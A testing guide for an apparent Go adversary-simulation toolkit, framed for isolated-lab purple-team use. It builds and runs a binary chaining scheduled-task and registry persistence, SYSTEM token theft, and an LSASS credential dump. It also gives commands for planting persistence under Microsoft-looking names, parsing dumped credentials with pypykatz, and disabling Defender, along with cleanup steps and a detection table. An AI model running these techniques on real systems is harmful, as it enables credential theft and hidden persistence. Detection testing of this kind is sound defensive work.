# Testing Guide

> **Use only in an isolated lab VM you own or have written authorization to test.**
> Snapshot before each test. Roll back when done.

## Lab setup

| Item | Recommended |
|---|---|
| OS | Windows 10 / 11 VM |
| Snapshot | Ready before each test |
| Sysmon | [SwiftOnSecurity config](https://github.com/SwiftOnSecurity/sysmon-config) for telemetry |
| Defender | Real-time off, or test directory excluded |
| Go | 1.21+ (`go version`) |
| Account | Admin for service / token / creds tests; standard user for the rest |
| Tools | Sysinternals autoruns, Process Explorer, pypykatz (for LSASS parsing) |

---

## Build

```sh
# All library packages
GOOS=windows GOARCH=amd64 go build ./pkg/...

# Composed sim binary (the main deliverable)
GOOS=windows GOARCH=amd64 go build -o sim.exe ./cmd/sim

# Stripped
GOOS=windows GOARCH=amd64 go build -ldflags "-s -w" -o sim.exe ./cmd/sim

# Individual standalone PoC from examples/
GOOS=windows GOARCH=amd64 go build -o persist-registry.exe ./examples/persistence-registry
```

---

## Running the composed sim (cmd/sim)

The sim chains T1053.005 + T1547.001 + T1134.001 + T1003.001 in one binary.

```cmd
:: Requires elevated cmd
sim.exe C:\Tools\payload.exe C:\Tools\lsass.dmp
```

Expected output:
```
[*] run scheduled-task (T1053.005)
[+] scheduled-task done
[*] run registry-run-key (T1547.001)
[+] registry-run-key done
[*] run token-impersonation (T1134.001)
[+] token-impersonation done
[*] run lsass-dump (T1003.001)
[+] lsass-dump done
[+] simulation complete
```

Parse the dump offline (does not require Mimikatz on target):
```sh
pypykatz lsa minidump lsass.dmp
```

---

## Building a custom sim in code

Add/remove techniques to match the TTP chain you're testing:

```go
s := sim.New().
    Add(&persistence.SchTask{
        PayloadPath: `C:\Tools\payload.exe`,
        UseXML:      true,
    }).
    Add(&tokens.Steal{
        TargetExe:     "winlogon.exe",
        SpawnExe:      `C:\Windows\System32\cmd.exe`,
        EnableSeDebug: true,
    })

// Print what would run before committing
for _, p := range s.Plan() { fmt.Println(p) }

if err := s.Run(); err != nil { log.Fatal(err) }

// Revert persistence after the test
s.Cleanup()
```

---

## Individual technique tests

### Registry Run Key (T1547.001)

```cmd
:: Plant
persist-registry.exe   :: or use the library directly

:: Verify
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdateHelper

:: Trigger: logoff + logon

:: Cleanup (Cleanup() or manual)
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdateHelper /f
```

### Scheduled Task (T1053.005)

```cmd
:: Verify after Run()
schtasks /Query /TN MicrosoftEdgeUpdateCore /V /FO LIST

:: Manual trigger
schtasks /Run /TN MicrosoftEdgeUpdateCore

:: Cleanup
schtasks /Delete /TN MicrosoftEdgeUpdateCore /F
```

### Startup Folder (T1547.001)

```cmd
:: Verify
dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Cleanup
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\OneDriveHelper.exe"
```

### Windows Service (T1543.003)

```cmd
:: Verify (admin cmd)
sc query WinHelperSvc
reg query "HKLM\SYSTEM\CurrentControlSet\Services\WinHelperSvc" /v ImagePath

:: Trigger immediately (otherwise waits for boot)
s.(*persistence.Service).Start()   :: via Go, or:
sc start WinHelperSvc

:: Cleanup
sc stop WinHelperSvc && sc delete WinHelperSvc
```

### COM Hijack (T1546.015)

```cmd
:: Verify
reg query "HKCU\Software\Classes\CLSID\{0F87369F-A4E5-4CFC-BD3E-73E6154572DD}\InprocServer32"

:: Trigger: open taskschd.msc; Process Monitor will show DLL load attempt

:: Cleanup
reg delete "HKCU\Software\Classes\CLSID\{0F87369F-A4E5-4CFC-BD3E-73E6154572DD}" /f
```

### Token Impersonation (T1134.001)

```cmd
:: Verify in spawned window
whoami    :: expected: nt authority\system
```

### LSASS Dump (T1003.001)

```cmd
:: Verify
dir C:\Tools\lsass.dmp

:: Parse (on attacker machine, no Defender)
pypykatz lsa minidump lsass.dmp
```

---

## Detection reference

| Technique | MITRE | Primary telemetry |
|---|---|---|
| Registry Run Key | T1547.001 | Sysmon EID 13 on `Run` key |
| Scheduled Task | T1053.005 | Security EID 4698, Sysmon EID 11 in `\System32\Tasks` |
| Startup Folder | T1547.001 | Sysmon EID 11 in `Startup\` |
| Windows Service | T1543.003 | Security EID 7045 / 4697 |
| COM Hijack | T1546.015 | Sysmon EID 12/13/14 on `HKCU\...\CLSID` |
| Token Impersonation | T1134.001 | Sysmon EID 10 (ProcessAccess), Security EID 4624 logon type 9 |
| LSASS Dump | T1003.001 | Security EID 4656 on lsass, Defender AV alert |

Audit everything at once:
```cmd
autoruns.exe -a * -h
```

---

## Known limitations

- All techniques target 64-bit Windows 10/11.
- No opsec hardening (string obfuscation, unhooking, sleep masking).
- The `pkg/creds/LSASSDump` is flagged by Defender in default config — disable real-time protection or use an exclusion in the lab.
- Standalone `examples/` PoCs are preserved originals with no library dependencies; build them with `go build ./examples/<name>`.
